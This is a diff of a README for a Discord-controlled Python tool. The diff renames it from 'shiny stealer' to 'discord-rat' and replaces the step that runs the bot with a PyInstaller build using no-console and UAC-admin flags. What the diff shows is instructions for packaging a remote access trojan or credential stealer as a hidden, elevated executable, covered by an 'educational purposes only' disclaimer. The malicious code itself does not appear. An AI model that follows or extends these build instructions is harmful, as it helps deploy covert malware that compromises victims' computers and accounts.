@@ -70,7 +70,7 @@ Download the files to your target directory.
 ### 2. Install Dependencies
 
 ```bash
-pip install -r requirements.txt
+python -m pip install -r requirements.txt
 ```
 
 **Required packages:**
@@ -122,10 +122,10 @@ config = {
 4. Copy the generated URL and open in browser
 5. Select your server and authorize
 
-### 6. Run the Bot
+### 6. Make exe
 
 ```bash
-python discord.py
+python -m PyInstaller --onefile --noconsole --uac-admin discord.py
 ```
 
 ## 📖 Usage Examples
@@ -197,7 +197,7 @@ python discord.py
 ## 📁 File Structure
 
 ```
-shiny stealer/
+discord-rat/
 ├── discord.py          # Main bot script
 ├── requirements.txt    # Python dependencies
 └── README.md          # This file
@@ -237,7 +237,7 @@ Some commands may require administrator privileges:
 
 ### Import errors
 ```bash
-pip install --upgrade -r requirements.txt
+python -m pip install --upgrade -r requirements.txt
 ```
 
 ## 📝 License
@@ -251,3 +251,4 @@ This is a private tool. Modify as needed for your specific use case.
 ---
 
 **Made for authorized remote administration and educational purposes only.**
+
